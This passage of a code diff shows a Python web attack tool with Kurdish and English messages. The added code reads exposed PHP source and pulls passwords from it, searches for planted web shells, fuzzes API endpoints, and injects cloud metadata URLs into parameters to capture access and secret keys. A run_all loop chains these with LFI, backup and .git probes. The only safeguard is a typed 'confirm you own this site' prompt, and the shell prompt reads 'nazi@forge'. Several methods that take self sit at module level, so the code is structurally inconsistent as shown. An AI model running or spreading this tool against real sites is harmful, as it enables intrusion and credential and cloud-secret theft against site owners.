+    """Test direct PHP source access"""
+    print("\n\033[96m[5/7]\033[0m PHP Source Direct...")
+    found = 0
+    for p in PHP_FILES:
+        full = url.rstrip('/') + '/' + p
+        r = self.cl.req(full)
+        if r['err'] or r['s'] != 200:
+            continue
+        # Check for PHP source
+        if '<?php' in r['t'] or 'define(' in r['t'] or 'DB_' in r['t']:
+            self.add(full, '', 'PHP', '',
+                     "PHP source direct (" + str(r['n']) + "B)",
+                     "CRITICAL")
+            # Extract passwords
+            pwds = self.extract_passwords(r['t'])
+            for pwd in pwds[:5]:
+                self.passwords.append({'url': full, 'password': pwd})
+                self.add(full, '', 'PASSWORD', pwd,
+                         "Password found", "CRITICAL")
+            found += 1
+    print("  \033[92m[+]\033[0m Found " + str(found))
+
+def test_shell_files(self, url):
+    """Detect existing shells"""
+    print("\n\033[96m[6/7]\033[0m Shell Detector (" + str(len(SHELL_FILES)) + ")...")
+    found = 0
+    for p in SHELL_FILES:
+        full = url.rstrip('/') + '/' + p
+        r = self.cl.req(full)
+        if r['err'] or r['s'] != 200:
+            continue
+        if any(x in r['t'].lower() for x in
+               ['cmd', 'exec', 'system', 'shell_exec', 'passthru']):
+            self.add(full, '', 'SHELL', '',
+                     "Shell file detected!", "CRITICAL")
+            found += 1
+    print("  \033[92m[+]\033[0m Found " + str(found))
+
+def test_cms(self, url):
+    """Detect CMS"""
+    print("\n\033[96m[7/7]\033[0m CMS Detection...")
+    found = 0
+    for cms, paths in CMS_PATHS.items():
+        hits = 0
+        for p in paths:
+            full = url.rstrip('/') + '/' + p
+            r = self.cl.req(full)
+            if not r['err'] and r['s'] in (200, 301, 302, 403):
+                hits += 1
+        if hits >= 2:
+            self.add(url, '', 'CMS', '',
+                     cms + " detected (" + str(hits) + " paths)",
+                     "HIGH")
+            found += 1
+    print("  \033[92m[+]\033[0m Found " + str(found) + " CMS")
+def fuzz_api(self, url):
+    """Fuzz API endpoints"""
+    print("\n\033[96m[*]\033[0m API Fuzzing (" + str(len(API_ENDPOINTS)) + ")...")
+    found = 0
+    with ThreadPoolExecutor(max_workers=self.threads) as ex:
+        futures = {}
+        for p in API_ENDPOINTS:
+            futures[ex.submit(self.check_path, url, p)] = p
+        for fut in as_completed(futures):
+            try:
+                res = fut.result()
+                if res and res['s'] in (200, 401, 403):
+                    self.add(res['url'], '', 'API', '',
+                             "API endpoint (" + str(res['s']) + ")",
+                             "MEDIUM")
+                    found += 1
+            except Exception:
+                pass
+    print("  \033[92m[+]\033[0m Found " + str(found))
+
+def test_cloud(self, url):
+    """Test cloud metadata"""
+    print("\n\033[96m[*]\033[0m Cloud Metadata...")
+    params = self.params(url)
+    if not params:
+        params = ['url', 'file', 'path', 'src']
+    found = 0
+    for p in params[:3]:
+        for meta in CLOUD_METADATA:
+            test_url = self.inject(url, p, meta)
+            r = self.cl.req(test_url)
+            if r['err']:
+                continue
+            for ind in ['ami-id', 'instance-id', 'access_key',
+                        'secret_key', 'computeMetadata']:
+                if ind in r['t']:
+                    self.add(test_url, p, 'CLOUD', meta,
+                             "Cloud metadata: " + ind, "CRITICAL")
+                    found += 1
+                    break
+    print("  \033[92m[+]\033[0m Found " + str(found))
+
+def save_json(self, filename):
+    """Save findings as JSON"""
+    data = {
+        'target': self.url,
+        'findings': self.f,
+        'files_read': self.files_read,
+        'passwords': self.passwords,
+    }
+    with open(filename, 'w', encoding='utf-8') as fp:
+        json.dump(data, fp, indent=2, ensure_ascii=False)
+    print("\033[92m[+]\033[0m JSON saved: " + filename)
+
+def run_all(self):
+    print("\n\033[96m" + "=" * 60 + "\033[0m")
+    print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
+    print("\033[96m" + "=" * 60 + "\033[0m")
+
+    # 1. LFI Auto
+    try:
+        self.test_lfi_auto(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 2. PHP Filter
+    try:
+        self.test_php_filter(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 3. Backup
+    try:
+        self.test_backup(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 4. Git
+    try:
+        self.test_git(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 5. PHP Source
+    try:
+        self.test_php_source(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 6. Shell
+    try:
+        self.test_shell_files(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 7. CMS
+    try:
+        self.test_cms(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 8. API
+    try:
+        self.fuzz_api(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # 9. Cloud
+    try:
+        self.test_cloud(self.url)
+    except Exception as e:
+        print("  \033[91m[!]\033[0m " + str(e))
+
+    # Final report
+    print("\n\033[96m" + "=" * 60 + "\033[0m")
+    crit = sum(1 for f in self.f if f['severity'] == 'CRITICAL')
+    high = sum(1 for f in self.f if f['severity'] == 'HIGH')
+    med = sum(1 for f in self.f if f['severity'] == 'MEDIUM')
+    print("  Files Checked: " + str(self.checked))
+    print("  Files Read: " + str(len(self.files_read)))
+    print("  Passwords Found: \033[1m\033[91m" + str(len(self.passwords)) + "\033[0m")
+    print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
+    print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
+    print("    \033[43m HIGH     \033[0m " + str(high))
+    print("    \033[93m MEDIUM   \033[0m " + str(med))
+    print("\033[96m" + "=" * 60 + "\033[0m\n")
+# ═══════════════════════════════════════════════════════════════════════════
+# AUTO-DETECT + MAIN
+# ═══════════════════════════════════════════════════════════════════════════
+
+def is_url(text):
+    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$', text):
+        return True
+    if text.startswith(('http://', 'https://')):
+        return True
+    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text):
+        return True
+    if text.startswith('localhost'):
+        return True
+    return False
+
+
+def normalize_url(text):
+    if not text.startswith(('http://', 'https://')):
+        text = 'http://' + text
+    return text
+
 
 def main():
-    print_banner()
-    print(f"{Fore.YELLOW}[!] تەنها بۆ ماڵپەڕی خۆت بەکاریبهێنە!{Style.RESET_ALL}\n")
-    
-    target = input(f"{Fore.CYAN}ناونیشانی ماڵپەڕەکەت بنووسە (وەک: http://example.com): {Style.RESET_ALL}").strip()
-    
-    if not target.startswith("http"):
-        target = "http://" + target
-    
-    if not target.endswith("/"):
-        target += "/"
+    print(LOGO)
+    print("\n\033[96m" + "=" * 60 + "\033[0m")
+    print("\033[92m  File Reader - Type your OWN site domain.\033[0m")
+    print("\033[93m  Warning: Use only on YOUR OWN site!\033[0m")
+    print("\033[96m" + "=" * 60 + "\033[0m")
+    print("\n\033[93mAccepted formats:\033[0m")
+    print("  \033[92mkurd4u.com\033[0m              - Domain")
+    print("  \033[92mhttps://kurd4u.com\033[0m      - With protocol")
+    print("  \033[92mhttp://kurd4u.com/path\033[0m  - Full URL")
+    print("  \033[92m192.168.1.1\033[0m             - IP address")
+    print("\n\033[93mOther commands:\033[0m")
+    print("  \033[92mcookie <value>\033[0m   - Set cookie")
+    print("  \033[92mproxy <URL>\033[0m      - Set proxy")
+    print("  \033[92mthreads <N>\033[0m      - Set thread count")
+    print("  \033[92msave <file>\033[0m      - Save JSON report")
+    print("  \033[92mstatus\033[0m           - Show settings")
+    print("  \033[92mclear\033[0m            - Clear screen")
+    print("  \033[92mexit\033[0m             - Quit\n")
 
-    host = target.split('//')[1].split('/')[0].split(':')[0]
+    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}
 
-    confirm = input(f"{Fore.YELLOW}ئایا تۆ خاوەنی ئەم ماڵپەڕەیت؟ (yes/no): {Style.RESET_ALL}").strip().lower()
-    if confirm != "yes":
-        print(f"{Fore.RED}[!] تکایە تەنها ماڵپەڕی خۆت بەکاربهێنە.{Style.RESET_ALL}")
-        sys.exit(0)
+    while True:
+        try:
+            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
+                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print("\n\033[93m[!] Bye\033[0m")
+            break
 
-    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}[*] ئامانج: {target}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}[*] هۆست: {host}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
+        if not line:
+            continue
 
-    all_findings = {
-        "target": target,
-        "host": host,
-        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-        "files": [],
-        "lfi": [],
-        "sqli": [],
-        "xss": [],
-        "forms": [],
-        "ports": []
-    }
+        parts = line.split(maxsplit=1)
+        cmd = parts[0].lower()
+        arg = parts[1].strip() if len(parts) > 1 else ""
 
-    # ١. پشکنینی دەرگاکان
-    all_findings["ports"] = scan_ports(host)
+        if cmd in ('exit', 'quit', 'q'):
+            print("\033[93mBye.\033[0m")
+            break
+        elif cmd == 'cookie':
+            if arg:
+                st['cookie'] = arg
+                print("\033[92m[+] Cookie set\033[0m")
+            else:
+                print("\033[91m[!] cookie <value>\033[0m")
+        elif cmd == 'proxy':
+            if arg:
+                st['proxy'] = arg
+                print("\033[92m[+] Proxy set\033[0m")
+            else:
+                print("\033[91m[!] proxy <URL>\033[0m")
+        elif cmd == 'threads':
+            if arg:
+                try:
+                    st['threads'] = int(arg)
+                    print("\033[92m[+] Threads: " + arg + "\033[0m")
+                except Exception:
+                    print("\033[91m[!] threads <number>\033[0m")
+            else:
+                print("\033[91m[!] threads <number>\033[0m")
+        elif cmd == 'status':
+            print("\n\033[96mSettings:\033[0m")
+            print("  Cookie  : " + str(st['cookie'] or '(none)'))
+            print("  Proxy   : " + str(st['proxy'] or '(none)'))
+            print("  Threads : " + str(st['threads']) + "\n")
+        elif cmd == 'clear':
+            os.system('clear')
+            print(LOGO)
+        elif cmd == 'save':
+            if st['last'] and arg:
+                st['last'].save_json(arg)
+            else:
+                print("\033[91m[!] save <filename>\033[0m")
+        elif is_url(cmd):
+            url = normalize_url(cmd)
+            print("\n\033[93m[!]\033[0m Only use on YOUR OWN site!")
+            print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
+            conf = input("\033[93m    Confirm you own this site? (yes/no): \033[0m").strip().lower()
+            if conf not in ('yes', 'y', 'بەڵێ', 'b'):
+                print("\033[93m[!] Aborted.\033[0m")
+                continue
+            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
+            sc = Scan(url, cl, threads=st['threads'])
+            try:
+                sc.run_all()
+                st['last'] = sc
+            except KeyboardInterrupt:
+                print("\n\033[93m[!] Stopped\033[0m")
+                st['last'] = sc
+            except Exception as e:
+                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
+        else:
+            print("\033[91m[!] Unknown: " + cmd + "\033[0m")
+            print("\033[93m    Type a domain or 'help'\033[0m")
 
-    # ٢. گەڕان
-    links, forms = crawl_site(target)
-    all_findings["forms"] = forms
 
-    # ٣. پشکنینی فایلەکان
-    all_findings["files"] = scan_files(target)
-
-    # ٤. پشکنینی LFI/SQLI/XSS
-    print(f"\n{Fore.BLUE}[*] پشکنینی LFI, SQLI, XSS لەسەر {len(links)} لینک...{Style.RESET_ALL}")
-    for link in list(links)[:30]:
-        all_findings["lfi"].extend(test_lfi(link))
-        all_findings["sqli"].extend(test_sqli(link))
-        all_findings["xss"].extend(test_xss(link))
-
-    # ٥. پشکنینی فۆڕمەکان
-    for form in forms:
-        if form["method"] == "get" and form["inputs"]:
-            params = "&".join([f"{inp}=test" for inp in form["inputs"]])
-            test_url = f"{form['action']}?{params}"
-            all_findings["lfi"].extend(test_lfi(test_url))
-            all_findings["sqli"].extend(test_sqli(test_url))
-            all_findings["xss"].extend(test_xss(test_url))
-
-    # ====================== ڕاپۆرتی کۆتایی ======================
-    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}                    ڕاپۆرتی کۆتایی{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-    
-    print(f"{Fore.YELLOW}کۆی دۆزینەوەکان:{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}•{Style.RESET_ALL} دەرگا کراوەکان: {Fore.RED}{len(all_findings['ports'])}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}•{Style.RESET_ALL} فایلەکان: {Fore.RED}{len(all_findings['files'])}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}•{Style.RESET_ALL} LFI: {Fore.RED}{len(all_findings['lfi'])}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}•{Style.RESET_ALL} SQLI: {Fore.RED}{len(all_findings['sqli'])}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}•{Style.RESET_ALL} XSS: {Fore.RED}{len(all_findings['xss'])}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}•{Style.RESET_ALL} فۆڕمەکان: {Fore.RED}{len(all_findings['forms'])}{Style.RESET_ALL}")
-
-    report_file = f"report_{int(time.time())}.json"
-    save_report(all_findings, report_file)
-    
-    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}[!] بەرنامەکە ڕاگیرا.{Style.RESET_ALL}")
-        sys.exit(0)
+        print("\n\033[93m[!] Bye\033[0m")
